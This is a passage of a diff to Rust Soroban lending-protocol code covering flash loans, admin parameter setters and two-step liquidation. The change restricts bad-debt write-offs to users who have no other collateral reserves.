         debt_to_cover: u128,
         _receive_a_token: bool,
     ) -> Result<(), KineticRouterError> {
         let _guard = acquire_reentrancy_guard(&env);
         crate::liquidation::liquidation_call(
             env.clone(),
             liquidator,
             collateral_asset,
             debt_asset,
             user,
             debt_to_cover,
             _receive_a_token,
         )
     }
 
     pub fn set_flash_loan_premium(env: Env, premium_bps: u128) -> Result<(), KineticRouterError> {
         crate::params::set_flash_loan_premium(env, premium_bps)
     }
 
     /// Set maximum flash loan premium allowed (admin only)
     ///
     /// # Arguments
     /// * `max_premium_bps` - Maximum premium in basis points (e.g., 100 = 1%)
     ///
     /// # Returns
     /// * `Ok(())` if max premium updated successfully
     /// * `Err(Unauthorized)` if caller is not admin
     pub fn set_flash_loan_premium_max(env: Env, max_premium_bps: u128) -> Result<(), KineticRouterError> {
         crate::params::set_flash_loan_premium_max(env, max_premium_bps)
     }
 
     pub fn get_flash_loan_premium_max(env: Env) -> u128 {
         crate::params::get_flash_loan_premium_max(env)
     }
 
     pub fn set_hf_liquidation_threshold(env: Env, threshold: u128) -> Result<(), KineticRouterError> {
         crate::params::set_hf_liquidation_threshold(env, threshold)
     }
 
     pub fn get_hf_liquidation_threshold(env: Env) -> u128 {
         crate::params::get_hf_liquidation_threshold(env)
     }
 
     pub fn set_min_swap_output_bps(env: Env, min_output_bps: u128) -> Result<(), KineticRouterError> {
         crate::params::set_min_swap_output_bps(env, min_output_bps)
     }
 
     pub fn get_min_swap_output_bps(env: Env) -> u128 {
         crate::params::get_min_swap_output_bps(env)
     }
 
     pub fn set_partial_liq_hf_threshold(env: Env, threshold: u128) -> Result<(), KineticRouterError> {
         crate::params::set_partial_liq_hf_threshold(env, threshold)
     }
 
     pub fn get_partial_liq_hf_threshold(env: Env) -> u128 {
         crate::params::get_partial_liq_hf_threshold(env)
     }
 
     pub fn get_flash_loan_premium(env: Env) -> u128 {
         crate::params::get_flash_loan_premium(env)
     }
 
     /// Set extra premium charged for flash liquidations (admin only).
     /// This is on top of the regular protocol fee collected during liquidation.
     /// Set to 0 to disable the extra fee (default).
     pub fn set_flash_liquidation_premium(env: Env, premium_bps: u128) -> Result<(), KineticRouterError> {
         crate::params::set_flash_liquidation_premium(env, premium_bps)
     }
 
     pub fn get_flash_liquidation_premium(env: Env) -> u128 {
         crate::params::get_flash_liquidation_premium(env)
     }
 
     /// Sets the price tolerance for two-step liquidation execution (in basis points).
     /// Default is 300 (3%). Admin has full flexibility to set any value.
     pub fn set_liquidation_price_tolerance(env: Env, tolerance_bps: u128) -> Result<(), KineticRouterError> {
         crate::params::set_liquidation_price_tolerance(env, tolerance_bps)
     }
 
     /// M-07
     pub fn set_asset_staleness_threshold(env: Env, asset: Address, threshold_seconds: u64) -> Result<(), KineticRouterError> {
         crate::params::set_asset_staleness_threshold(env, asset, threshold_seconds)
     }
 
     /// M-07
     pub fn get_asset_staleness_threshold(env: Env, asset: Address) -> Option<u64> {
         crate::params::get_asset_staleness_threshold(env, asset)
     }
 
     /// Execute a flash loan
     ///
     /// Flash loans are permissionless - anyone can initiate them.
     /// The receiver contract must implement `execute_operation` callback.
     ///
     /// # Parameters
     /// - `initiator`: Address initiating the flash loan (must authorize)
     /// - `receiver`: Contract that will receive the loan and execute callback
     /// - `assets`: Assets to borrow
     /// - `amounts`: Amounts to borrow for each asset
     /// - `params`: Arbitrary data passed to receiver
     ///
     /// # Receiver Callback
     /// The receiver must implement `execute_operation` with the standard flash loan interface.
     ///
     /// # Authorization
     /// Initiator must authorize the call, but anyone can be an initiator.
     /// The receiver handles its own authorization logic.
     ///
     /// # Errors
     /// - `InvalidFlashLoanParams`: Invalid parameters
     /// - `InsufficientFlashLoanLiquidity`: Not enough liquidity
     /// - `FlashLoanExecutionFailed`: Receiver callback failed
     /// - `FlashLoanNotRepaid`: Loan not fully repaid
     pub fn flash_loan(
         env: Env,
         initiator: Address,
         receiver: Address,
         assets: Vec<Address>,
         amounts: Vec<u128>,
         params: soroban_sdk::Bytes,
     ) -> Result<(), KineticRouterError> {
         let _guard = acquire_reentrancy_guard(&env);
         initiator.require_auth();
 
         // Validate input vector lengths
         if assets.len() > MAX_RESERVES || amounts.len() > MAX_RESERVES {
             panic_with_error!(&env, KineticRouterError::InvalidFlashLoanParams);
         }
         if assets.len() != amounts.len() {
             panic_with_error!(&env, KineticRouterError::InvalidFlashLoanParams);
         }
 
         for i in 0..assets.len() {
             if let Some(asset) = assets.get(i) {
                 validation::validate_reserve_whitelist_access(&env, &asset, &initiator)?;
                 // N-13
                 validation::validate_reserve_whitelist_access(&env, &asset, &receiver)?;
                 // AC-03
                 validation::validate_reserve_blacklist_access(&env, &asset, &initiator)?;
                 validation::validate_reserve_blacklist_access(&env, &asset, &receiver)?;
             }
         }
         crate::flash_loan::internal_flash_loan(
             &env, initiator, receiver, assets, amounts, params, true, // charge premium
         )
     }
 
     /// Prepare a liquidation - validates and stores authorization (TX1 of 2-step liquidation)
     /// This is the expensive validation step (~40M CPU) but can fail/retry safely.
     ///
     /// # Arguments
     /// * `liquidator` - Address executing the liquidation
     /// * `user` - Address being liquidated
     /// * `debt_asset` - Asset to repay
     /// * `collateral_asset` - Asset to seize
     /// * `debt_to_cover` - Amount of debt to repay
     /// * `min_swap_out` - Minimum acceptable swap output (slippage protection)
     /// * `swap_handler` - Optional custom swap handler address
     ///
     /// # Returns
     /// * `LiquidationAuthorization` - Authorization token for execute_liquidation
     pub fn prepare_liquidation(
         env: Env,
         liquidator: Address,
         user: Address,
         debt_asset: Address,
         collateral_asset: Address,
         debt_to_cover: u128,
         min_swap_out: u128,
         swap_handler: Option<Address>,
     ) -> Result<storage::LiquidationAuthorization, KineticRouterError> {
         let _guard = acquire_reentrancy_guard(&env);
         liquidator.require_auth();
 
         if storage::is_paused(&env) {
             return Err(KineticRouterError::AssetPaused);
         }
 
         // Step 1: Validate liquidator whitelist/blacklist (~1M CPU)
         validation::validate_liquidation_whitelist_access(&env, &liquidator)?;
         validation::validate_liquidation_blacklist_access(&env, &liquidator)?;
 
         // Step 2: Get asset prices from oracle (~10M CPU)
         let (debt_price_data, collateral_price_data) =
             crate::liquidation::get_asset_prices_batch(&env, &debt_asset, &collateral_asset)?;
 
         // Step 3: Calculate health factor (expensive - loops all reserves, ~25M CPU)
         // CRIT-02: Pass known prices from step 2 to avoid redundant oracle calls
         let mut known_prices = soroban_sdk::Map::new(&env);
         known_prices.set(debt_asset.clone(), debt_price_data.price);
         known_prices.set(collateral_asset.clone(), collateral_price_data.price);
 
         let user_config = storage::get_user_configuration(&env, &user);
         let params = crate::calculation::AccountDataParams {
             known_prices: Some(&known_prices),
             known_reserves: None,
             user_config: Some(&user_config),
             extra_assets: None,
             return_prices: false,
             known_balances: None,
         };
         let result = crate::calculation::calculate_user_account_data_unified(
             &env,
             &user,
             params,
         )?;
         let user_account_data = result.account_data;
 
         // Step 4: Verify position is liquidatable (HF < 1.0)
         if user_account_data.total_debt_base == 0 {
             return Err(KineticRouterError::NoDebtOfRequestedType);
         }
 
         if user_account_data.health_factor >= WAD {
             return Err(KineticRouterError::InvalidLiquidation);
         }
 
         // Step 5: Fetch and validate reserve data (~2M CPU)
         let raw_collateral_reserve = storage::get_reserve_data(&env, &collateral_asset)?;
         let raw_debt_reserve = storage::get_reserve_data(&env, &debt_asset)?;
 
         let collateral_reserve_data = crate::calculation::update_state(&env, &collateral_asset, &raw_collateral_reserve)?;
         let debt_reserve_data = crate::calculation::update_state(&env, &debt_asset, &raw_debt_reserve)?;
 
         if !collateral_reserve_data.configuration.is_active() {
             return Err(KineticRouterError::AssetNotActive);
         }
         if !debt_reserve_data.configuration.is_active() {
             return Err(KineticRouterError::AssetNotActive);
         }
         if collateral_reserve_data.configuration.is_paused() {
             return Err(KineticRouterError::AssetPaused);
         }
         if debt_reserve_data.configuration.is_paused() {
             return Err(KineticRouterError::AssetPaused);
         }
 
         if collateral_price_data.price == 0 || debt_price_data.price == 0 {
             return Err(KineticRouterError::PriceOracleNotFound);
         }
 
         // Get oracle config for dynamic price precision conversion
         let oracle_config = crate::price::get_oracle_config(&env)?;
         let oracle_to_wad = k2_shared::calculate_oracle_to_wad_factor(oracle_config.price_precision);
 
         // Step 5b: Enforce close factor — prevent liquidating more than allowed share of debt.
         let effective_debt_to_cover;
         {
             // N-01
             let mut debt_balance_args = Vec::new(&env);
             debt_balance_args.push_back(user.to_val());
             debt_balance_args.push_back(IntoVal::into_val(
                 &debt_reserve_data.variable_borrow_index,
                 &env,
             ));
 
             let debt_balance_result = env.try_invoke_contract::<i128, KineticRouterError>(
                 &debt_reserve_data.debt_token_address,
                 &Symbol::new(&env, "balance_of_with_index"),
                 debt_balance_args,
             );
 
             let debt_balance = match debt_balance_result {
                 Ok(Ok(bal)) => bal,
                 Ok(Err(_)) | Err(_) => return Err(KineticRouterError::NoDebtOfRequestedType),
             };
 
             let debt_decimals = debt_reserve_data.configuration.get_decimals() as u32;
             let debt_decimals_pow = 10_u128
                 .checked_pow(debt_decimals)
                 .ok_or(KineticRouterError::MathOverflow)?;
 
             // N-01 / WP-M2: Close factor validation
             let individual_debt_base = crate::calculation::value_in_base(
                 &env, k2_shared::safe_i128_to_u128(&env, debt_balance),
                 debt_price_data.price, oracle_to_wad, debt_decimals_pow,
             )?;
 
             // Fetch collateral balance for small position check
             let collateral_decimals = collateral_reserve_data.configuration.get_decimals() as u32;
             let collateral_decimals_pow = 10_u128
                 .checked_pow(collateral_decimals)
                 .ok_or(KineticRouterError::MathOverflow)?;
 
             let mut coll_bal_args = Vec::new(&env);
             coll_bal_args.push_back(user.to_val());
             coll_bal_args.push_back(IntoVal::into_val(
                 &collateral_reserve_data.liquidity_index, &env,
             ));
             let user_collateral_balance = match env.try_invoke_contract::<i128, KineticRouterError>(
                 &collateral_reserve_data.a_token_address,
                 &Symbol::new(&env, "balance_of_with_index"),
                 coll_bal_args,
             ) {
                 Ok(Ok(bal)) => k2_shared::safe_i128_to_u128(&env, bal),
                 Ok(Err(_)) | Err(_) => 0u128,
             };
 
             let individual_collateral_base = crate::calculation::value_in_base(
                 &env, user_collateral_balance,
                 collateral_price_data.price, oracle_to_wad, collateral_decimals_pow,
             )?;
             let debt_to_cover_base = crate::calculation::value_in_base(
                 &env, debt_to_cover,
                 debt_price_data.price, oracle_to_wad, debt_decimals_pow,
             )?;
             crate::liquidation::validate_close_factor(
                 &env, user_account_data.health_factor,
                 individual_debt_base, individual_collateral_base, debt_to_cover_base,
             )?;
 
             // H-08: Check min_remaining_debt early in prepare_liquidation
             // Clamp debt_to_cover to actual debt balance when it would leave dust
             // below min_remaining_debt. This handles the race condition where interest
             // accrues between the caller's balance query and tx execution.
             let debt_to_cover_i128 = k2_shared::safe_u128_to_i128(&env, debt_to_cover);
             let remaining_debt = debt_balance
                 .checked_sub(debt_to_cover_i128)
                 .ok_or(KineticRouterError::MathOverflow)?;
             effective_debt_to_cover = if remaining_debt > 0 {
                 let remaining_debt_u128 = k2_shared::safe_i128_to_u128(&env, remaining_debt);
                 let min_remaining_whole = debt_reserve_data.configuration.get_min_remaining_debt();
                 if min_remaining_whole > 0 {
                     let min_remaining_debt = (min_remaining_whole as u128)
                         .checked_mul(debt_decimals_pow)
                         .ok_or(KineticRouterError::MathOverflow)?;
                     if remaining_debt_u128 < min_remaining_debt {
                         // Dust remainder: clamp to full debt for clean liquidation
                         k2_shared::safe_i128_to_u128(&env, debt_balance)
                     } else {
                         debt_to_cover
                     }
                 } else {
                     debt_to_cover
                 }
             } else {
                 debt_to_cover
             };
         }
 
         // Step 6: Calculate liquidation amounts
         let (_collateral_amount, computed_collateral_to_seize) =
             crate::calculation::calculate_liquidation_amounts_with_reserves(
                 &env,
                 &collateral_reserve_data,
                 &debt_reserve_data,
                 effective_debt_to_cover,
                 collateral_price_data.price,
                 debt_price_data.price,
                 oracle_to_wad,
             )?;
 
         if effective_debt_to_cover == 0 || computed_collateral_to_seize == 0 {
             return Err(KineticRouterError::InvalidAmount);
         }
 
         // Step 7: Store authorization with 5-minute expiry
         let nonce = storage::get_and_increment_liquidation_nonce(&env);
         // I-05, L-03: Increased from 300 to 600 ledgers (~10 min) for congestion tolerance
         let expires_at = env.ledger().timestamp()
             .checked_add(600)
             .ok_or(KineticRouterError::MathOverflow)?;
 
         let auth = storage::LiquidationAuthorization {
             liquidator: liquidator.clone(),
             user: user.clone(),
             debt_asset: debt_asset.clone(),
             collateral_asset: collateral_asset.clone(),
             debt_to_cover: effective_debt_to_cover,
             collateral_to_seize: computed_collateral_to_seize,
             min_swap_out,
             debt_price: debt_price_data.price,
             collateral_price: collateral_price_data.price,
             health_factor_at_prepare: user_account_data.health_factor,
             expires_at,
             nonce,
             swap_handler,
         };
 
         storage::set_liquidation_authorization(&env, &liquidator, &user, &auth);
 
         env.events().publish(
             (symbol_short!("prep_ok"),),
             (nonce, expires_at),
         );
 
         Ok(auth)
     }
 
     /// Execute a prepared liquidation - atomic swap + debt repayment (TX2 of 2-step liquidation)
     /// Uses pre-validated data from prepare_liquidation (~60M CPU).
     ///
     /// # Arguments
     /// * `liquidator` - Address executing the liquidation (must match authorization)
     /// * `user` - Address being liquidated (must match authorization)
     /// * `debt_asset` - Asset to repay (must match authorization)
     /// * `collateral_asset` - Asset to seize (must match authorization)
     /// * `deadline` - Transaction deadline timestamp
     pub fn execute_liquidation(
         env: Env,
         liquidator: Address,
         user: Address,
         debt_asset: Address,
         collateral_asset: Address,
         deadline: u64,
     ) -> Result<(), KineticRouterError> {
         let _guard = acquire_reentrancy_guard(&env);
         liquidator.require_auth();
 
         if storage::is_paused(&env) {
             return Err(KineticRouterError::AssetPaused);
         }
 
         validation::validate_liquidation_whitelist_access(&env, &liquidator)?;
         validation::validate_liquidation_blacklist_access(&env, &liquidator)?;
 
         // Step 1: Load and validate authorization
         let auth = storage::get_liquidation_authorization(&env, &liquidator, &user)?;
 
         // Verify not expired
         // WP-L5: Do not call remove_liquidation_authorization before return Err —
         // Soroban rolls back all state changes on error, making the removal ineffective.
         // The auth will expire naturally based on expires_at.
         if env.ledger().timestamp() > auth.expires_at {
             return Err(KineticRouterError::Expired);
         }
 
         // Verify deadline
         if env.ledger().timestamp() > deadline {
             return Err(KineticRouterError::Expired);
         }
 
         // Verify parameters match authorization
         if auth.debt_asset != debt_asset || auth.collateral_asset != collateral_asset {
             return Err(KineticRouterError::InvalidLiquidation);
         }
 
         // Step 2: Quick price sanity check (5% tolerance to detect manipulation)
         let (current_debt_price, current_collateral_price) =
             crate::liquidation::get_asset_prices_batch(&env, &debt_asset, &collateral_asset)?;
 
         // M-03
         let tolerance_bps = storage::get_liquidation_price_tolerance_bps(&env);
         let lower_factor = 10000u128.checked_sub(tolerance_bps).ok_or(KineticRouterError::MathOverflow)?;
         let upper_factor = 10000u128.checked_add(tolerance_bps).ok_or(KineticRouterError::MathOverflow)?;
 
         // Validate debt price within tolerance
         let debt_price_min = auth.debt_price.checked_mul(lower_factor).ok_or(KineticRouterError::MathOverflow)?.checked_div(10000).ok_or(KineticRouterError::MathOverflow)?;
         let debt_price_max = auth.debt_price.checked_mul(upper_factor).ok_or(KineticRouterError::MathOverflow)?.checked_div(10000).ok_or(KineticRouterError::MathOverflow)?;
         if current_debt_price.price < debt_price_min || current_debt_price.price > debt_price_max {
             return Err(KineticRouterError::InvalidLiquidation);
         }
 
         // Validate collateral price within tolerance
         let collateral_price_min = auth.collateral_price.checked_mul(lower_factor).ok_or(KineticRouterError::MathOverflow)?.checked_div(10000).ok_or(KineticRouterError::MathOverflow)?;
         let collateral_price_max = auth.collateral_price.checked_mul(upper_factor).ok_or(KineticRouterError::MathOverflow)?.checked_div(10000).ok_or(KineticRouterError::MathOverflow)?;
         if current_collateral_price.price < collateral_price_min || current_collateral_price.price > collateral_price_max {
             return Err(KineticRouterError::InvalidLiquidation);
         }
 
         // Step 3: Update state + HF calc + close-factor (shared queries)
         // update_state before HF calc enables known_reserves passthrough (saves 2 storage reads).
         // HF calc's balance_cache is reused in close-factor block (saves 2 cross-contract calls).
         let raw_debt_reserve = storage::get_reserve_data(&env, &debt_asset)?;
         let debt_reserve_data = crate::calculation::update_state(&env, &debt_asset, &raw_debt_reserve)?;
 
         let raw_collateral_reserve = storage::get_reserve_data(&env, &collateral_asset)?;
         let collateral_reserve_data = crate::calculation::update_state(&env, &collateral_asset, &raw_collateral_reserve)?;
 
         // F-07
         let oracle_config = crate::price::get_oracle_config(&env)?;
         let oracle_to_wad = k2_shared::calculate_oracle_to_wad_factor(oracle_config.price_precision);
 
         // CRIT-01: Pass known prices + reserves to HF calc
         let mut exec_known_prices = soroban_sdk::Map::new(&env);
         exec_known_prices.set(debt_asset.clone(), current_debt_price.price);
         exec_known_prices.set(collateral_asset.clone(), current_collateral_price.price);
 
         let mut known_reserves = soroban_sdk::Map::new(&env);
         known_reserves.set(debt_asset.clone(), debt_reserve_data.clone());
         known_reserves.set(collateral_asset.clone(), collateral_reserve_data.clone());
 
         let user_config = storage::get_user_configuration(&env, &user);
         let params = crate::calculation::AccountDataParams {
             known_prices: Some(&exec_known_prices),
             known_reserves: Some(&known_reserves),
             user_config: Some(&user_config),
             extra_assets: None,
             return_prices: false,
             known_balances: None,
         };
         let result = crate::calculation::calculate_user_account_data_unified(
             &env,
             &user,
             params,
         )?;
         let user_account_data = result.account_data;
+        let has_other_collateral = crate::liquidation::user_has_other_collateral(
+            &env,
+            &user_config,
+            &result.balance_cache,
+            &collateral_asset,
+            k2_shared::safe_reserve_id(&env, collateral_reserve_data.id),
+        )?;
 
         // Verify position is still liquidatable at execution time
         // WP-L5: No remove_liquidation_authorization here — rolled back on Err anyway
         if user_account_data.health_factor >= WAD {
             return Err(KineticRouterError::InvalidLiquidation);
         }
 
         // Reuse cached balances from HF calc (saves 2 cross-contract calls vs re-querying)
         let exec_user_collateral_balance = result.balance_cache
             .try_get(collateral_asset.clone())
             .ok()
             .flatten()
             .map(|(coll, _)| coll)
             .ok_or(KineticRouterError::InsufficientCollateral)?;
 
         let debt_balance = {
             let (_, debt_u128) = result.balance_cache
                 .try_get(debt_asset.clone())
                 .ok()
                 .flatten()
                 .ok_or(KineticRouterError::NoDebtOfRequestedType)?;
             k2_shared::safe_u128_to_i128(&env, debt_u128)
         };
 
         // N-07: Close-factor validation using cached balances
         let effective_debt_to_cover;
         {
             let debt_decimals = debt_reserve_data.configuration.get_decimals() as u32;
             let debt_decimals_pow = 10_u128
                 .checked_pow(debt_decimals)
                 .ok_or(KineticRouterError::MathOverflow)?;
 
             let individual_debt_base = crate::calculation::value_in_base(
                 &env, k2_shared::safe_i128_to_u128(&env, debt_balance),
                 current_debt_price.price, oracle_to_wad, debt_decimals_pow,
             )?;
 
             let collateral_decimals = collateral_reserve_data.configuration.get_decimals() as u32;
             let collateral_decimals_pow = 10_u128
                 .checked_pow(collateral_decimals)
                 .ok_or(KineticRouterError::MathOverflow)?;
 
             let individual_collateral_base = crate::calculation::value_in_base(
                 &env, exec_user_collateral_balance,
                 current_collateral_price.price, oracle_to_wad, collateral_decimals_pow,
             )?;
             let auth_debt_to_cover_base = crate::calculation::value_in_base(
                 &env, auth.debt_to_cover,
                 current_debt_price.price, oracle_to_wad, debt_decimals_pow,
             )?;
             // WP-L5: No remove_liquidation_authorization here — rolled back on Err anyway
             if let Err(_) = crate::liquidation::validate_close_factor(
                 &env, user_account_data.health_factor,
                 individual_debt_base, individual_collateral_base, auth_debt_to_cover_base,
             ) {
                 return Err(KineticRouterError::LiquidationAmountTooHigh);
             }
 
             // M-13: min_remaining_debt check — clamp to full debt if dust remainder
             let debt_to_cover_i128 = k2_shared::safe_u128_to_i128(&env, auth.debt_to_cover);
             let remaining_debt = debt_balance
                 .checked_sub(debt_to_cover_i128)
                 .ok_or(KineticRouterError::MathOverflow)?;
 
             effective_debt_to_cover = if remaining_debt > 0 {
                 let remaining_debt_u128 = k2_shared::safe_i128_to_u128(&env, remaining_debt);
                 let min_remaining_whole = debt_reserve_data.configuration.get_min_remaining_debt();
                 if min_remaining_whole > 0 {
                     let min_remaining_debt = (min_remaining_whole as u128)
                         .checked_mul(debt_decimals_pow)
                         .ok_or(KineticRouterError::MathOverflow)?;
                     if remaining_debt_u128 < min_remaining_debt {
                         // Dust remainder: clamp to full debt for clean liquidation
                         k2_shared::safe_i128_to_u128(&env, debt_balance)
                     } else {
                         auth.debt_to_cover
                     }
                 } else {
                     auth.debt_to_cover
                 }
             } else {
                 auth.debt_to_cover
             };
         }
 
         let pool_address = env.current_contract_address();
 
         // Step 4: Recompute collateral with current prices and enforce borrower-safe bound
         let (_collateral_amount, computed_collateral_to_seize) =
             crate::calculation::calculate_liquidation_amounts_with_reserves(
                 &env,
                 &collateral_reserve_data,
                 &debt_reserve_data,
                 effective_debt_to_cover,
                 current_collateral_price.price,
                 current_debt_price.price,
                 oracle_to_wad,
             )?;
 
         // Use minimum to protect borrower from over-seizure
         let safe_collateral_to_seize = if computed_collateral_to_seize < auth.collateral_to_seize {
             env.events().publish(
                 (symbol_short!("coll_adj"),),
                 (auth.collateral_to_seize, computed_collateral_to_seize),
             );
             computed_collateral_to_seize
         } else {
             auth.collateral_to_seize
         };
 
         // M-16 — P2 optimization: reuse collateral balance from close-factor block.
         // Within the same transaction, the balance hasn't changed (no burns happened yet).
         let user_collateral_balance = exec_user_collateral_balance;
 
         let collateral_cap_triggered;
         let (actual_debt_to_cover, actual_collateral_to_seize) = if safe_collateral_to_seize > user_collateral_balance {
             collateral_cap_triggered = true;
             // Ceiling division: adjusted_debt = ceil(debt * user_balance / seizure)
             let adjusted_debt = {
                 let dtc = U256::from_u128(&env, effective_debt_to_cover);
                 let ucb = U256::from_u128(&env, user_collateral_balance);
                 let cts = U256::from_u128(&env, safe_collateral_to_seize);
                 let one = U256::from_u128(&env, 1u128);
                 dtc.mul(&ucb).add(&cts).sub(&one).div(&cts)
                     .to_u128()
                     .ok_or(KineticRouterError::MathOverflow)?
             };
             env.events().publish(
                 (symbol_short!("col_cap"),),
                 (safe_collateral_to_seize, user_collateral_balance, effective_debt_to_cover, adjusted_debt),
             );
             (adjusted_debt, user_collateral_balance)
         } else {
             collateral_cap_triggered = false;
             (effective_debt_to_cover, safe_collateral_to_seize)
         };
 
         // Step 6: Set up callback params for flash loan
         // S-01: Scale min_swap_out proportionally when collateral cap reduces amounts
         let adjusted_min_swap_out = if collateral_cap_triggered {
             let mso = U256::from_u128(&env, auth.min_swap_out);
             let acs = U256::from_u128(&env, actual_collateral_to_seize);
             let scs = U256::from_u128(&env, safe_collateral_to_seize);
             mso.mul(&acs).div(&scs)
                 .to_u128()
                 .ok_or(KineticRouterError::MathOverflow)?
         } else {
             auth.min_swap_out
         };
 
         let callback_params = LiquidationCallbackParams {
             liquidator: liquidator.clone(),
             user: user.clone(),
             debt_asset: debt_asset.clone(),
             collateral_asset: collateral_asset.clone(),
             debt_to_cover: actual_debt_to_cover,
             collateral_to_seize: actual_collateral_to_seize,
             min_swap_out: adjusted_min_swap_out,
             deadline_ts: deadline,
             debt_price: current_debt_price.price,
             collateral_price: current_collateral_price.price,
             collateral_reserve_data: collateral_reserve_data.clone(),
             debt_reserve_data: debt_reserve_data.clone(),
             swap_handler: auth.swap_handler,
         };
         storage::set_liquidation_callback_params(&env, &callback_params);
 
         // Step 7: Execute flash loan (atomic swap + debt repayment)
         let mut assets = Vec::new(&env);
         assets.push_back(debt_asset.clone());
         let mut amounts = Vec::new(&env);
         amounts.push_back(actual_debt_to_cover);
         let params_bytes = soroban_sdk::Bytes::new(&env);
 
         crate::flash_loan::internal_flash_loan_with_reserve_data(
             &env,
             pool_address.clone(),
             pool_address.clone(),
             assets,
             amounts,
             params_bytes,
             false, // No premium for internal liquidation
             Some(&debt_reserve_data),
         )?;
 
         let fresh_debt_reserve_data = &debt_reserve_data;
         let fresh_collateral_reserve_data = &collateral_reserve_data;
 
         let (debt_total_scaled_cb, collateral_total_scaled_cb,
              user_remaining_coll_scaled, user_remaining_debt_scaled) =
             storage::get_liquidation_scaled_supplies(&env)
                 .ok_or(KineticRouterError::InvalidLiquidation)?;
         storage::remove_liquidation_scaled_supplies(&env);
 
         // Track callback scaled totals for interest rate update (saves 2 scaled_total_supply calls)
         let mut final_debt_scaled_total: Option<u128> = Some(k2_shared::safe_i128_to_u128(&env, debt_total_scaled_cb));
         let final_collateral_scaled_total: Option<u128> = Some(k2_shared::safe_i128_to_u128(&env, collateral_total_scaled_cb));
 
         let mut remaining_debt = if user_remaining_debt_scaled <= 0 {
             0i128
         } else {
             let scaled_u128 = k2_shared::safe_i128_to_u128(&env, user_remaining_debt_scaled);
             let actual = k2_shared::ray_mul(&env, scaled_u128, fresh_debt_reserve_data.variable_borrow_index)?;
             k2_shared::safe_u128_to_i128(&env, actual)
         };
 
         let remaining_collateral = if user_remaining_coll_scaled <= 0 {
             0i128
         } else {
             let scaled_u128 = k2_shared::safe_i128_to_u128(&env, user_remaining_coll_scaled);
             let actual = k2_shared::ray_mul(&env, scaled_u128, fresh_collateral_reserve_data.liquidity_index)?;
             k2_shared::safe_u128_to_i128(&env, actual)
         };
 
-        // M-16 / H-05: All collateral seized — remaining debt is unrecoverable bad debt.
-        // Socialize unconditionally (no threshold). There is no collateral for another
-        // liquidation to seize, so the debt must be burned and tracked as deficit.
-        if collateral_cap_triggered && remaining_debt > 0 {
+        // M-16 / H-05: Remaining debt becomes bad debt only if the liquidation
+        // exhausted the selected collateral and the user has no other collateral reserves.
+        if collateral_cap_triggered && !has_other_collateral && remaining_debt > 0 {
             let remaining_debt_u128 = k2_shared::safe_i128_to_u128(&env, remaining_debt);
 
             let mut bad_debt_burn_args = Vec::new(&env);
             bad_debt_burn_args.push_back(pool_address.to_val());
             bad_debt_burn_args.push_back(user.to_val());
             bad_debt_burn_args.push_back(IntoVal::into_val(&remaining_debt_u128, &env));
             bad_debt_burn_args.push_back(IntoVal::into_val(
                 &fresh_debt_reserve_data.variable_borrow_index, &env,
             ));
 
             let bad_debt_burn_result = env.try_invoke_contract::<(bool, i128, i128), KineticRouterError>(
                 &fresh_debt_reserve_data.debt_token_address,
                 &Symbol::new(&env, "burn_scaled"),
                 bad_debt_burn_args,
             );
 
             match bad_debt_burn_result {
                 Ok(Ok((_is_zero, updated_total_scaled, _user_remaining))) => {
                     final_debt_scaled_total = Some(k2_shared::safe_i128_to_u128(&env, updated_total_scaled));
                 }
                 Ok(Err(_)) | Err(_) => {
                     return Err(KineticRouterError::InsufficientCollateral);
                 }
             }
 
             // Track bad debt as deficit instead of socializing to depositors (Aave V3.3 pattern)
             storage::add_reserve_deficit(&env, &debt_asset, remaining_debt_u128);
 
             remaining_debt = 0;
 
             // I-03: Structured deficit event with collateral context
             env.events().publish(
                 (symbol_short!("deficit"), symbol_short!("bad_debt")),
                 (user.clone(), collateral_asset.clone(), debt_asset.clone(), remaining_debt_u128, storage::get_reserve_deficit(&env, &debt_asset)),
             );
         } else if remaining_debt > 0 {
             // F-1: Match liquidation.rs — when collateral_cap not triggered but partial
             // liquidation leaves dust below min_remaining_debt, revert.
             let min_remaining_whole = fresh_debt_reserve_data.configuration.get_min_remaining_debt();
             if min_remaining_whole > 0 {
                 let remaining_debt_u128 = k2_shared::safe_i128_to_u128(&env, remaining_debt);
                 let debt_decimals = fresh_debt_reserve_data.configuration.get_decimals() as u32;
                 let debt_decimals_pow = 10_u128
                     .checked_pow(debt_decimals)
                     .ok_or(KineticRouterError::MathOverflow)?;
                 let min_remaining_debt_val = (min_remaining_whole as u128)
                     .checked_mul(debt_decimals_pow)
                     .ok_or(KineticRouterError::MathOverflow)?;
                 if remaining_debt_u128 < min_remaining_debt_val {
                     return Err(KineticRouterError::InvalidLiquidation);
                 }
             }
         }
 
         // H-2
         {
             let mut post_user_config = storage::get_user_configuration(&env, &user);
             let mut config_changed = false;
             if remaining_collateral <= 0 {
                 post_user_config.set_using_as_collateral(
                     k2_shared::safe_reserve_id(&env, fresh_collateral_reserve_data.id), false,
                 );
                 config_changed = true;
             }
             if remaining_debt <= 0 {
                 post_user_config.set_borrowing(
                     k2_shared::safe_reserve_id(&env, fresh_debt_reserve_data.id), false,
                 );
                 config_changed = true;
             }
             if config_changed {
                 storage::set_user_configuration(&env, &user, &post_user_config);
             }
         }
 
         // WP-L7: Check min leftover value for both debt and collateral (mirrors liquidation.rs)
         // When partial liquidation leaves tiny remaining positions, they become
         // uneconomical to liquidate further. Revert to force full liquidation.
         if remaining_debt > 0 && remaining_collateral > 0 {
             let remaining_debt_u128 = k2_shared::safe_i128_to_u128(&env, remaining_debt);
             let debt_decimals = fresh_debt_reserve_data.configuration.get_decimals() as u32;
             let debt_decimals_pow = 10_u128
                 .checked_pow(debt_decimals)
                 .ok_or(KineticRouterError::MathOverflow)?;
             let remaining_debt_value = {
                 let rd = U256::from_u128(&env, remaining_debt_u128);
                 let dp = U256::from_u128(&env, current_debt_price.price);
                 let otw = U256::from_u128(&env, oracle_to_wad);
                 let ddp = U256::from_u128(&env, debt_decimals_pow);
                 rd.mul(&dp).mul(&otw).div(&ddp)
                     .to_u128()
                     .ok_or(KineticRouterError::MathOverflow)?
             };
             let remaining_collateral_u128 = k2_shared::safe_i128_to_u128(&env, remaining_collateral);
             let collateral_decimals = fresh_collateral_reserve_data.configuration.get_decimals() as u32;
             let collateral_decimals_pow = 10_u128
                 .checked_pow(collateral_decimals)
                 .ok_or(KineticRouterError::MathOverflow)?;
             let remaining_collateral_value = {
                 let rc = U256::from_u128(&env, remaining_collateral_u128);
                 let cp = U256::from_u128(&env, current_collateral_price.price);
                 let otw = U256::from_u128(&env, oracle_to_wad);
                 let cdp = U256::from_u128(&env, collateral_decimals_pow);
                 rc.mul(&cp).mul(&otw).div(&cdp)
                     .to_u128()
